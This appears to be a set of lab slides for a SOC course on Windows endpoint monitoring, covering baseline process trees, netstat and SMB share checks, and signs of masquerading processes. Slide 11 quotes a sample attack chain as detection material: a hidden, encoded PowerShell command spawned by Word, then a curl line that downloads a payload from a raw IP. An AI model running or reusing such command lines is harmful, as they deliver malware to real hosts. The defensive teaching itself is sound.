# Lab 07-08: Endpoint Security Part I — Windows Processes & Sysinternals

> **Course:** Cybersecurity Operations (SOC Lab)  
> **Instructor:** Hussein Al-Selwi  
> **Total Slides:** 22 Slides  
> **Source Presentation:** `Endpoint_Security_Lab7_8.html`  

### 📋 Overview
Mastering host-level visibility on Windows endpoints: normal process tree baselines (smss, csrss, wininit, services, svchost, explorer), Process Hacker/Explorer, detecting unquoted paths, and spotting disguised malware binaries.

---

## 📑 Table of Contents

- [Slide 01: Introduction](#slide-01-introduction)
- [Slide 02: Domain Objectives](#slide-02-domain-objectives)
- [Slide 03: What Is Endpoint Security?](#slide-03-what-is-endpoint-security)
- [Slide 04: What Is an Endpoint?](#slide-04-what-is-an-endpoint)
- [Slide 05: Endpoint Security Controls](#slide-05-endpoint-security-controls)
- [Slide 06: Endpoint Security Monitoring](#slide-06-endpoint-security-monitoring)
- [Slide 07: Analyzing Network Connections](#slide-07-analyzing-network-connections)
- [Slide 08: Checking Shared Resources](#slide-08-checking-shared-resources)
- [Slide 09: Analyzing Running Processes](#slide-09-analyzing-running-processes)
- [Slide 10: Types of Processes](#slide-10-types-of-processes)
- [Slide 11: Parent-Child Process Relationships](#slide-11-parent-child-process-relationships)
- [Slide 12: The Windows Process Tree](#slide-12-the-windows-process-tree)
- [Slide 13: Windows Processes — System](#slide-13-windows-processes-system)
- [Slide 14: Windows Processes — smss.exe](#slide-14-windows-processes-smss-exe)
- [Slide 15: Windows Processes — csrss.exe](#slide-15-windows-processes-csrss-exe)
- [Slide 16: Windows Processes — wininit.exe](#slide-16-windows-processes-wininit-exe)
- [Slide 17: Windows Processes — services.exe](#slide-17-windows-processes-services-exe)
- [Slide 18: Windows Processes — svchost.exe](#slide-18-windows-processes-svchost-exe)
- [Slide 19: Windows Processes — lsass.exe](#slide-19-windows-processes-lsass-exe)
- [Slide 20: Windows Processes — winlogon.exe](#slide-20-windows-processes-winlogon-exe)
- [Slide 21: Windows Processes — explorer.exe](#slide-21-windows-processes-explorer-exe)
- [Slide 22: Process Investigation](#slide-22-process-investigation)

---

## Slide 01: Introduction

> **Category:** `INCIDENT DETECTION & RESPONSE`

### Endpoint Security

Understanding endpoints, the controls that protect them, and how to read system internals to detect an attacker who's already inside.

Lab 07 & 08 – Endpoint Detection and Monitoring

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Welcome students to the Endpoint Security domain. This shifts focus from the network itself to the devices sitting at the edges of it — where users work and where attackers most often try to land.

---

## Slide 02: Domain Objectives

> **Category:** `LECTURE OVERVIEW`

- Understand the fundamentals of endpoint security monitoring
- Explore endpoint types , controls , and detection strategies
- Understand core operating system components and their functions
- Develop practical skills in extracting insights from system internals
- Deploy and configure a unified endpoint detection solution

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk through each objective briefly. Emphasize the progression: understand fundamentals, then explore endpoint types and controls, then get into OS internals, then apply that to real system investigation, then finally deploy a working EDR solution.

---

## Slide 03: What Is Endpoint Security?

> **Category:** `INTRODUCTION`

### Protecting Where Users and Data Actually Live

Endpoints are the doors into an organization — the laptops, phones, servers, and devices where people work and where attackers ultimately try to land. Endpoint security is the practice of protecting these devices from compromise, and closely watching them so that attacks which do get through can still be caught in the act.

- **The Common Entry Point**: Phishing links, malicious attachments, and exploited software most often land on an endpoint first.
- **Closest to the Evidence**: Every process, file, and connection an attacker touches leaves a trace on the endpoint itself.
- **Hard to Fully Control**: Devices are numerous, diverse, and often mobile — making consistent protection a real challenge.

> [!IMPORTANT]
> The goal: not just preventing compromise, but maintaining enough visibility into every endpoint that an intrusion can be detected and stopped before it achieves its objective.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Set up the domain conceptually before getting into definitions and types. The core idea: endpoints are where users work and where attackers land, so they're both the most common entry point and the richest source of evidence when something goes wrong.

---

## Slide 04: What Is an Endpoint?

> **Category:** `ENDPOINT FUNDAMENTALS`

An endpoint is any device that connects to and communicates over a network — the physical hardware where code actually executes and data is actually accessed, which makes it something both defenders and attackers care about.

- **Workstations**: Desktops and laptops used for daily work — the most common device, and a frequent phishing target.
- **Mobile Devices**: Phones and tablets that move across networks constantly, often outside direct organizational control.
- **Servers**: Always-on systems hosting applications and data — high-value targets that rarely go offline.
- **IoT Devices**: Cameras, sensors, and smart hardware — connected, but often limited in the security controls they support.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Define endpoint clearly, then walk through the four main categories. Emphasize that despite being very different devices, they all run an OS, execute code, and generate the same broad categories of telemetry that we'll monitor later.

---

## Slide 05: Endpoint Security Controls

> **Category:** `CONTROLS`

No single control catches everything — real endpoint protection layers several together, from signature-based prevention up to behavioral detection and response.

Prevention & Detection Antivirus / Antimalware — scans files and activity, matching known patterns and signatures. Endpoint Detection and Response (EDR) — agent-based, real-time monitoring and response across process, file, registry, and network activity. Extended Detection and Response (XDR) — integrates multiple controls and telemetry sources, with runbooks and automated response to routine threats. Data Loss Prevention (DLP) — protects sensitive data at rest, in transit, and in processing through access controls, masking, and prevention rules. Behavior & Access Control User and Entity Behavior Analytics (UBA) — monitors user behavior patterns and flags deviations from a historic and contextual baseline, surfacing insider threats, account compromise, and data exfiltration. Host-based Firewall — controls incoming and outgoing traffic directly on the host.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Group the controls into two families: controls that prevent and detect malicious activity directly on the endpoint, and controls that watch behavior and access at the network edge of the endpoint. Keep this focused on what each control does at a high level.

---

## Slide 06: Endpoint Security Monitoring

> **Category:** `MONITORING`

Effective monitoring comes down to watching a handful of signal categories closely, since almost everything an attacker does on an endpoint shows up in one of them.

- **Process Execution**: Monitoring running processes — executable files, PIDs, command-line arguments, and the parent-child process hierarchy.
- **File System Changes**: Tracking creation, modification, and deletion of files through File Integrity Monitoring (FIM).
- **Network Connections**: Traffic and connections initiated from the endpoint, along with the processes and executables behind them.
- **Registry Modifications**: Monitoring changes to registry keys and values — a common spot for persistence and configuration tampering.

> [!IMPORTANT]
> Coming up: we'll use these four categories as the foundation for extracting insights from system internals and configuring a working detection solution.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Cover the four core categories of telemetry that endpoint monitoring is built on. These are the signal sources that everything in this domain — EDR, UBA, investigation — ultimately draws from.

---

## Slide 07: Analyzing Network Connections

> **Category:** `SYSTEM INTERNALS`

Malware has to talk to succeed — command-and-control callbacks, payload downloads, lateral movement, and data exfiltration all show up as connections on the host. Reading those connections, and tying each one back to the process that opened it, is one of the fastest ways to catch an endpoint that's already been compromised.

netstat -anob CLI Built into Windows — no install needed, scriptable, and the fastest way to check connections during triage. -a All connections & listening ports -n Numeric addresses — skips slow DNS lookups -o Owning process ID (PID) per connection -b Executable behind the connection (admin) TCPView GUI · Sysinternals Same data as netstat , refreshed live and color-flashed as connections open and close Sortable by process, PID, or state — much faster to scan than raw text output Right-click a connection to close it or jump straight to its process

```powershell
C:\>
netstat -anob
Proto Local Address Foreign Address State PID
TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1220
[wininit.exe]
TCP 192.168.1.15:52142 142.250.72.14:443 ESTABLISHED 4832
[chrome.exe]
TCP 192.168.1.15:52210 185.220.101.7:4444 ESTABLISHED 6120
[powershell.exe] ← unfamiliar IP, uncommon port, unexpected caller
```

> [!IMPORTANT]
> The purpose: baseline what's normal for a host, then hunt for what isn't — unexpected LISTENING ports, ESTABLISHED connections to unfamiliar IPs or high/uncommon ports, and processes with no legitimate reason to be making outbound calls at all.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Purpose first: malware has to communicate to be useful, so connections are high-value evidence. Cover netstat -anob flag by flag, then TCPView as the GUI equivalent. Walk through the sample capture and point out what makes the last connection suspicious — unfamiliar IP, uncommon port, and a process (powershell.exe) with no normal reason to be calling out.

---

## Slide 08: Checking Shared Resources

> **Category:** `SYSTEM INTERNALS`

Network connections aren't the only way attackers move through a host — shared folders and admin shares (SMB) are a favorite path for lateral movement, dropping tools, and pulling data out. Checking what's shared, what's visible, and who's connected in is a quick way to catch that kind of exploitation early.

- **net shareCLI** `[CLI]`: Lists every folder shared out from this host — including hidden admin shares like C$ and ADMIN$ . Shows what an attacker could reach if they landed here.
- **net viewCLI** `[CLI]`: Shows shares visible on a remote machine — net view \\host — the same recon step an attacker runs to find what's worth pivoting to next.
- **net sessionCLI** `[CLI]`: Lists active inbound sessions to this host — who's currently connected and to which share. An unfamiliar remote user here means someone is already in.

```bash
C:\>
net share
Share name Resource Remark
C$ C:\ Default share
ADMIN$ C:\Windows Remote Admin
FINANCE C:\Shares\Finance ← not on the baseline share list
C:\>
net session
Computer User name Client Type Idle time
\\192.168.1.44 svc_backup Windows 10 00:02:11 ← unrecognized remote user
```

> [!WARNING]
> Why it matters: attackers routinely scan for open or misconfigured SMB shares to stage payloads, exfiltrate files, or move laterally between hosts — often the exact abuse behind the EternalBlue / SMB port-445 exploitation family. An unexpected share, an unrecognized session, or admin shares reachable without proper restrictions are all worth investigating immediately.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Bridge from network connections into shared resources — attackers enumerate and abuse SMB shares for lateral movement, staging tools, and exfiltration. Walk through net share (what's exposed), net view (what's visible from this host), and net session (who's connected in). Point out that an unexpected admin share, an unfamiliar remote session, or shares no one on the team recognizes are all red flags worth chasing.

---

## Slide 09: Analyzing Running Processes

> **Category:** `SYSTEM INTERNALS`

Almost everything an attacker does eventually runs as a process. Reading the process list closely — not just what's running, but what launched it and what arguments it was given — turns a wall of executable names into a story of what actually happened on the host.

- **tasklist**: Built-in CLI — lists running processes with PID, memory, and session; add /v for the owning window title.
- **wmic process**: Built-in CLI — queries process objects directly, including the full CommandLine and ParentProcessId .
- **Task Manager**: Built-in GUI — quick and familiar, but limited: no command line shown, and the process tree view is shallow.
- **Process Explorer**: Sysinternals GUI — full process tree, command line, loaded DLLs, and digital signature checks in one view.

> [!IMPORTANT]
> Before hunting for anomalies: you need to know what's normal. That starts with recognizing the three broad categories every process on a Windows host falls into.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Introduce the four tools before touching the deeper concepts. Emphasize the gap between the CLI tools (fast, scriptable, full command-line visibility with wmic) and the GUI tools (easier to scan, but Task Manager alone won't show you a command line or a deep tree — that's what Process Explorer is for).

---

## Slide 10: Types of Processes

> **Category:** `PROCESS FUNDAMENTALS`

Before judging whether a process looks right, you need to know what category it belongs to. On Windows, almost every process falls into one of three buckets.

- **System (Windows) Processes**: Core OS processes that start at boot and typically run with SYSTEM or kernel-level privileges — System , smss.exe , csrss.exe , wininit.exe , lsass.exe . Essential to the OS; should never be missing, duplicated oddly, or running from the wrong path.
- **User (App) Processes**: Applications the logged-in user launches directly — browsers, Office, custom software. Run under the user's own account and privileges, and are tied to their interactive session.
- **Service (Background) Processes**: Run continuously in the background, independent of any logged-in user — usually launched by services.exe . Includes svchost.exe instances hosting Windows services, antivirus agents, and update daemons.

> [!IMPORTANT]
> Next: we'll walk through the critical Windows system processes one at a time — what each one is supposed to look like, so you can immediately spot one that doesn't.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Establish the three categories before naming specific processes. This is the mental model students need before the System/smss/csrss/etc. deep-dives: is this a core OS process, something the logged-in user launched, or a background service? Most anomaly-spotting starts by asking which bucket a process should be in, and whether it's behaving like it.

---

## Slide 11: Parent-Child Process Relationships

> **Category:** `SYSTEM INTERNALS`

Every process is the child of the one that launched it. Legitimate software follows predictable lineages — when a process breaks that pattern, the mismatch is often the clearest signal available.

WINWORD.EXE PID 3344 "C:\Program Files\Microsoft Office\WINWORD.EXE" /n "invoice_report.docm" POWERSHELL.EXE PID 5820 · parent 3344 -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA... ANOMALY CMD.EXE PID 6104 · parent 5820 /c curl.exe -o update.exe http://185.220.101.7/payload

> [!WARNING]
> Classic red flag: an Office application spawning a shell like powershell.exe or cmd.exe is one of the most reliable indicators of a malicious macro executing — legitimate documents almost never need to launch a shell.

> [!IMPORTANT]
> For every process, check three things: the parent-child lineage (does this chain make sense?), the full command line (encoded, obfuscated, or unusual arguments), and the execution path — a "svchost.exe" running from a Temp folder is not the real svchost.exe.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Walk the tree top to bottom — WINWORD.EXE spawning POWERSHELL.EXE is the anomaly, and the encoded command line plus the further spawned CMD.EXE reaching out to a raw IP reinforces it. Close on what to check for any process you're investigating: parent, command line, and execution path.

---

## Slide 12: The Windows Process Tree

> **Category:** `WINDOWS PROCESSES`

Every legitimate process on a Windows host traces back to this same skeleton. Knowing the shape of the healthy tree is what makes a broken branch — a wrong parent, a missing link, an extra hop — jump out immediately.

System PID 4 smss.exe (Master) smss.exe (Session 0) smss.exe (Session 1) csrss.exe wininit.exe winlogon.exe csrss.exe services.exe lsass.exe userinit.exe svchost.exe explorer.exe

> [!IMPORTANT]
> Session 0 vs. Session 1: Session 0 is the isolated, non-interactive session that hosts services and the OS itself; Session 1 (and up) is the interactive desktop a user actually logs into. A process that should live in one session showing up in the other is a red flag on its own.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> This is the map before the individual deep-dives. Walk it top-down: System spawns the one and only smss.exe master instance, which forks into a per-session smss.exe — Session 0 for OS/services, Session 1+ for the interactive logon. Session 0's branch builds the service environment (services.exe, lsass.exe, svchost.exe); Session 1's branch builds the user's desktop (winlogon.exe → userinit.exe → explorer.exe). Point out that userinit.exe is transient — it exits after launching explorer.exe, which is why a live userinit.exe still running is itself worth a second look.

---

## Slide 13: Windows Processes — System

> **Category:** `WINDOWS PROCESSES`

### System PID 4

The System is not an actual executable but a representation of the Windows kernel itself. It owns the core system threads and is responsible for managing the CPU, memory, and hardware resources.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | None (or C:\Windows\system32\ntoskrnl.exe ) |
| PID | 4 |
| Parent Process | None (or System Idle Process) |
| Number of Instances | 1 |
| Start Time | At Boot |

> [!WARNING]
> Know the invariants: System should always be PID 4 , have no parent, and no file on disk. A process named "System" with a different PID, a parent, or a real image path is not the real one.

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> First of the critical-process deep-dives. System (PID 4) is the anchor case: it owns kernel-mode threads, has no image on disk, no parent, and always runs as PID 4 under Local System. Emphasize the invariants students should memorize, since deviations from any of them (wrong PID, an actual file path, a parent process) are a strong sign of masquerading malware.

---

## Slide 14: Windows Processes — smss.exe

> **Category:** `WINDOWS PROCESSES`

### smss.exe Session Manager Subsystem

smss.exe is the first user-mode process created by the kernel during startup. It is responsible for initializing new sessions and launching the next processes in the boot sequence, after which it terminates.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\smss.exe |
| Parent Process | System (4) |
| Number of Instances | 1 master, 1 child instance per session (children self-terminate) |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Second of the critical-process deep-dives. smss.exe is the Session Manager Subsystem — it's the direct child of System (PID 4) and the parent of wininit.exe and csrss.exe, tying straight back to the process tree diagram. One master instance persists for the life of the system; each per-session child instance does its job and self-terminates, so seeing more than one smss.exe still running is itself worth investigating.

---

## Slide 15: Windows Processes — csrss.exe

> **Category:** `WINDOWS PROCESSES`

### csrss.exe Client/Server Runtime Subsystem

csrss.exe runs continuously in the background of every session. It manages core functions such as console windows and shutdown procedures, and although users never interact with it directly, the system cannot function without it.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\csrss.exe |
| Parent Process | smss.exe (orphan process) |
| Number of Instances | Two or more |
| Start Time | Within seconds of boot (first two instances) |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Third of the critical-process deep-dives. csrss.exe is the Client/Server Runtime Subsystem — it's a child of smss.exe but shows as an orphan once smss.exe self-terminates, which is expected and not a red flag on its own. There are always two or more instances (one per session), and both should spin up within seconds of boot. A csrss.exe running from anywhere other than System32, or one running under a non-Local-System account, is masquerading malware.

---

## Slide 16: Windows Processes — wininit.exe

> **Category:** `WINDOWS PROCESSES`

### wininit.exe Windows Initialization

wininit.exe is a critical Windows system process that initializes the operating system during startup and launches essential system processes such as services.exe and lsass.exe

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\wininit.exe |
| Parent Process | smss.exe (orphan process) |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Fourth of the critical-process deep-dives. wininit.exe is what actually builds out Session 0 — the isolated, non-interactive session that hosts services and system processes, distinct from the interactive Session 1 a user logs into. It runs once, spawns services.exe and lsass.exe, and then its job is essentially done. Like csrss.exe, showing as an orphan is expected once smss.exe self-terminates.

---

## Slide 17: Windows Processes — services.exe

> **Category:** `WINDOWS PROCESSES`

### services.exe Service Control Manager

services.exe functions as the central manager for all Windows services, responsible for starting, stopping, and tracking them. Nearly every background service on the system ultimately traces back to this process.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\services.exe |
| Parent Process | wininit.exe |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> Fifth of the critical-process deep-dives. services.exe is the Service Control Manager (SCM) — it's the process that starts, stops, and manages every Windows service, which makes it one of the most abused parents in persistence hunting: a huge share of malicious autostart services show up as children of services.exe. Point out the LastKnownGood CurrentControlSet detail as a specific, memorable fact worth retaining.

---

## Slide 18: Windows Processes — svchost.exe

> **Category:** `WINDOWS PROCESSES`

### svchost.exe Service Host

svchost.exe allows multiple Windows services to run within a shared process rather than each requiring its own executable. As a result, it is normal for several instances of it to run simultaneously.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\svchost.exe |
| Parent Process | services.exe |
| Number of Instances | Many (typically 10+) |
| Start Time | Within seconds of boot or whenever services start |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> svchost.exe hosts service DLLs so many Windows services can share a small number of processes instead of each needing its own executable. The -k parameter groups related services into the same instance, which is why it's completely normal to see 10+ svchost.exe processes running at once — but that same normalcy is exactly what attackers exploit for masquerading, so the parent, path, and count all matter for spotting fakes.

---

## Slide 19: Windows Processes — lsass.exe

> **Category:** `WINDOWS PROCESSES`

### lsass.exe Local Security Authority Subsystem Service

lsass.exe authenticates user credentials at login and enforces the system's local security policies. Because it handles sensitive credential data, it is a frequent target for attackers attempting to extract passwords.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\lsass.exe |
| Parent Process | wininit.exe |
| Number of Instances | 1 |
| Start Time | Within seconds of boot |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> lsass.exe is the Local Security Authority Subsystem Service — it enforces the security policy on the system, handles user authentication, and writes to the security event log. There should only ever be one instance, running as Local System under wininit.exe, spawned within seconds of boot. It's one of the most targeted processes for credential dumping (e.g. Mimikatz), so any deviation from these invariants is a strong signal.

---

## Slide 20: Windows Processes — winlogon.exe

> **Category:** `WINDOWS PROCESSES`

### winlogon.exe Windows Logon

winlogon.exe manages the sign-in and sign-out screen. It also listens for the Ctrl+Alt+Del sequence, which protects users against fraudulent login screens designed to capture credentials.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\System32\winlogon.exe |
| Parent Process | smss.exe (orphan process) |
| Number of Instances | 1 or more |
| Start Time | Within seconds of boot (Session 1) |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> winlogon.exe manages the login and logout procedures, loads the user's profile (NTUSER.DAT), and is what listens for the Secure Attention Sequence (Ctrl+Alt+Del) to guard against credential-capturing fake login screens. It's an orphan process spawned by smss.exe, which then exits — so winlogon.exe legitimately has no living parent, a fact worth calling out since 'no parent' looks suspicious out of context but is normal here.

---

## Slide 21: Windows Processes — explorer.exe

> **Category:** `WINDOWS PROCESSES`

### explorer.exe Windows Explorer

explorer.exe provides the graphical interface that users directly interact with — the desktop, taskbar, Start Menu, and file windows are all rendered by this process.

| Item / Key | Value / Description |
| --- | --- |
| Image Path | %SystemRoot%\explorer.exe |
| Parent Process | userinit.exe (orphan process) |
| Number of Instances | 1 or more |
| Start Time | When interactive user sessions begin |

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> explorer.exe is the Windows shell — it draws the desktop, taskbar, and Start Menu, and provides the file/folder GUI. It's spawned by userinit.exe, which then exits, making explorer.exe another legitimate orphan. Because it runs under the logged-in user's own account (not a service account), it's a very common process for attackers to hide malicious child processes under, since a child of explorer.exe blends in with everyday user activity.

---

## Slide 22: Process Investigation

> **Category:** `PROCESS INVESTIGATION`

- Parent Process Is this the expected process hierarchy?
- Child Process Is this the expected process hierarchy?
- Command Line Arguments Does it include unusual switches, encoded commands, or suspicious paths?
- Process Names Typos, lookalikes, copies
- Image Path Is this process running the expected executable?

> [!NOTE] 🎙️ **Instructor Lecture Notes**
> This is the checklist to apply when looking at any suspicious process: does it sit where it should in the process tree (right parent, right children), is it launched with normal arguments, is the name itself legitimate rather than a typo or lookalike, and is it running from the expected executable path. Any one mismatch is a lead worth pulling on.

---

## 🎯 Summary & Key Takeaways

- **Module:** Lab 07-08: Endpoint Security Part I — Windows Processes & Sysinternals

- **Core Competencies Developed:** Hands-on triage, log analysis, threat hunting, and defensive incident response.

- **Course Reference:** Cybersecurity Operations Practical Labs by **Hussein Al-Selwi**.
